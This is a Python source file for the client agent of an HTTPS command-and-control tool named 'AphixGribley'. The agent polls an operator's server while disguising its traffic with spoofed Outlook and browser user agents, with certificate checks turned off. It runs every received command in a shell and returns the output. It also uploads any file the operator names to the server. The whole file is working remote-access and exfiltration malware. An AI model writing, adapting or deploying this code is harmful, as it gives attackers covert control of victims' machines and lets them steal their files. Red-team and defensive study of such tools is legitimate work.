# Authored by: Brent 'becrevex' Chambers
# Date: 03/22/2020 (Quarantine 2020 - Event 201!)
# Vendor Homepage: https://www.cygienesolutions.com/
# Filename: gribley_client.py
# Description: AphixGribley C2
# Aphix is an HTTPS C2 server which can establish remote control over Gribley client connected agents.

import requests
import os
import sys
import subprocess
import time
import ssl
import warnings
from random import choice

warnings.filterwarnings("ignore")
user_agents = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
				'Microsoft Office/15.0 (Windows NT 6.1; Microsoft Outlook 15.0.4631; Pro)',
				'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/6.0; .NET4.0E; .NET4.0C; Microsoft Outlook 15.0.4763; ms-office; MSOffice 15)',
				'Mozilla/4.0 (compatible; ms-office; MSOffice 16)',
				'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
				'msnbot-media/1.0 (+http://search.msn.com/msnbot.htm)']

try:
    soc = sys.argv[1]
except:
    print("Usage: gribley_client.py [host] [port]")
    sys.exit()

try:
    port = sys.argv[2]
except:
    port = 443



httpsrv = ('https://'+soc)
context = ssl.create_default_context()
headers = {'User-Agent': choice(user_agents)}
    
print("Connecting to ", httpsrv)

while True:
	req = requests.get(httpsrv, headers=headers, verify=False)
	command = req.text
	if 'terminate' in command:
		break
	elif 'grab' in command:
		grab, path = command.split("*")
		if os.path.exists(path):
			url = httpsrv + '/store'
			files = {'file': open(path, 'rb')}
			r = requests.post(url, files=files, headers=headers, verify=False)
		else:
			post_response = requests.post(url=httpsrv, data='[-] Not able to find the file!'.encode(), verify=False)
	else:
		CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		post_response = requests.post(url=httpsrv, data=CMD.stdout.read(), verify=False)
		post_response = requests.post(url=httpsrv, data=CMD.stderr.read(), verify=False)
	time.sleep(3)
"""
	except Exception as ex:
		print("Disconnect occurred")
		time.sleep(5)
		print("Reconnecting...")
"""	


